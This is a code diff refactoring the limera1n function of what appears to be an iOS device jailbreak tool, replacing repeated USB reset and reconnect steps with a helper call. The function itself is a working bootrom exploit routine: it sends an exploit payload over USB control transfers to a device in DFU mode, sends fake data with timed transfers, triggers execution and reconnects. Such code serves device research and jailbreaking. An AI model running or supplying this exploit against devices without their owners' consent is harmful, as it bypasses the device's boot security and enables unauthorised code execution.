@@ -148,8 +148,7 @@ static int patch_payload(io_client_t client)
 
 int limera1n(io_client_t client)
 {
-    IOReturn result;
-    transfer_t res;
+    transfer_t result;
     
     if(patch_payload(client) != 0) {
         ERROR("[%s] ERROR: Failed to generate payload!", __FUNCTION__);
@@ -161,65 +160,53 @@ int limera1n(io_client_t client)
     LOG_EXPLOIT_NAME("limera1n");
     
     LOG_PROGRESS("[%s] reconnecting", __FUNCTION__);
-    // io_devinfo will be lost
-    result = io_reset(client);
-    io_close(client);
-    client = NULL;
-    usleep(1000);
-    get_device_time_stage(&client, 5, DEVICE_DFU, false);
+    io_reconnect(&client, 5, DEVICE_DFU, USB_RESET|USB_REENUMERATE, false, 1000);
     if(!client) {
         ERROR("[%s] ERROR: Failed to reconnect to device", __FUNCTION__);
         return -1;
     }
     
     LOG_PROGRESS("[%s] sending exploit payload", __FUNCTION__);
-    res = usb_ctrl_transfer(client, 0x21, 1, 0x0000, 0x0000, (unsigned char *)payload, payloadLen);
-    DEBUGLOG("[%s] %x, %d", __FUNCTION__, res.ret, res.wLenDone);
-    if(res.wLenDone != payloadLen) {
+    result = usb_ctrl_transfer(client, 0x21, 1, 0x0000, 0x0000, (unsigned char *)payload, payloadLen);
+    DEBUGLOG("[%s] %x, %d", __FUNCTION__, result.ret, result.wLenDone);
+    if(result.wLenDone != payloadLen) {
         ERROR("[%s] ERROR: Failed to send payload", __FUNCTION__);
     }
     
     LOG_PROGRESS("[%s] sending fake data", __FUNCTION__);
-    res = usb_ctrl_transfer_with_time(client, 0xA1, 1, 0x0000, 0x0000, blank, 1, 100);
-    DEBUGLOG("[%s] %x, %d", __FUNCTION__, res.ret, res.wLenDone);
-    if(res.wLenDone != 1) {
+    result = usb_ctrl_transfer_with_time(client, 0xA1, 1, 0x0000, 0x0000, blank, 1, 100);
+    DEBUGLOG("[%s] %x, %d", __FUNCTION__, result.ret, result.wLenDone);
+    if(result.wLenDone != 1) {
         ERROR("[%s] ERROR: Failed to send fake data", __FUNCTION__);
     }
     
-    res = usb_ctrl_transfer_with_time(client, 0x21, 1, 0x0000, 0x0000, blank, 2048, 10);
-    DEBUGLOG("[%s] %x, %d", __FUNCTION__, res.ret, res.wLenDone); // kIOReturnTimeout
+    result = usb_ctrl_transfer_with_time(client, 0x21, 1, 0x0000, 0x0000, blank, 2048, 10);
+    DEBUGLOG("[%s] %x, %d", __FUNCTION__, result.ret, result.wLenDone); // kIOReturnTimeout
     
     LOG_PROGRESS("[%s] executing exploit", __FUNCTION__);
-    res = usb_ctrl_transfer_with_time(client, 0x21, 2, 0x0000, 0x0000, NULL, 0, 100);
-    DEBUGLOG("[%s] %x, %d", __FUNCTION__, res.ret, res.wLenDone); // kIOReturnTimeout
+    result = usb_ctrl_transfer_with_time(client, 0x21, 2, 0x0000, 0x0000, NULL, 0, 100);
+    DEBUGLOG("[%s] %x, %d", __FUNCTION__, result.ret, result.wLenDone); // kIOReturnTimeout
     
-    result = io_reset(client);
-    io_close(client);
-    client = NULL;
-    usleep(1000);
-    get_device_time_stage(&client, 5, DEVICE_DFU, false);
+    LOG_PROGRESS("[%s] reconnecting", __FUNCTION__);
+    io_reconnect(&client, 5, DEVICE_DFU, USB_RESET|USB_REENUMERATE, false, 1000);
     if(!client) {
         ERROR("[%s] ERROR: Failed to reconnect to device", __FUNCTION__);
         return -1;
     }
     
-    res = usb_ctrl_transfer_with_time(client, 0x21, 1, 0x0000, 0x0000, NULL, 0, 100);
-    DEBUGLOG("[%s] %x, %d", __FUNCTION__, res.ret, res.wLenDone);
-    res = usb_ctrl_transfer_with_time(client, 0xA1, 3, 0x0000, 0x0000, blank, 6, 100);
-    DEBUGLOG("[%s] %x, %d", __FUNCTION__, res.ret, res.wLenDone);
-    res = usb_ctrl_transfer_with_time(client, 0xA1, 3, 0x0000, 0x0000, blank, 6, 100);
-    DEBUGLOG("[%s] %x, %d", __FUNCTION__, res.ret, res.wLenDone);
-    res = usb_ctrl_transfer_with_time(client, 0xA1, 3, 0x0000, 0x0000, blank, 6, 100);
-    DEBUGLOG("[%s] %x, %d", __FUNCTION__, res.ret, res.wLenDone);
-    
-    result = io_reset(client);
+    result = usb_ctrl_transfer_with_time(client, 0x21, 1, 0x0000, 0x0000, NULL, 0, 100);
+    DEBUGLOG("[%s] %x, %d", __FUNCTION__, result.ret, result.wLenDone);
+    result = usb_ctrl_transfer_with_time(client, 0xA1, 3, 0x0000, 0x0000, blank, 6, 100);
+    DEBUGLOG("[%s] %x, %d", __FUNCTION__, result.ret, result.wLenDone);
+    result = usb_ctrl_transfer_with_time(client, 0xA1, 3, 0x0000, 0x0000, blank, 6, 100);
+    DEBUGLOG("[%s] %x, %d", __FUNCTION__, result.ret, result.wLenDone);
+    result = usb_ctrl_transfer_with_time(client, 0xA1, 3, 0x0000, 0x0000, blank, 6, 100);
+    DEBUGLOG("[%s] %x, %d", __FUNCTION__, result.ret, result.wLenDone);
     
     LOG_PROGRESS("[%s] exploit sent", __FUNCTION__);
-    // end
-    io_close(client);
-    client = NULL;
-    usleep(1000);
-    get_device_time_stage(&client, 5, DEVICE_DFU, true);
+    
+    LOG_PROGRESS("[%s] reconnecting", __FUNCTION__);
+    io_reconnect(&client, 5, DEVICE_DFU, USB_RESET|USB_REENUMERATE, true, 1000);
     if(!client) {
         ERROR("[%s] ERROR: Failed to reconnect to device", __FUNCTION__);
         return -1;
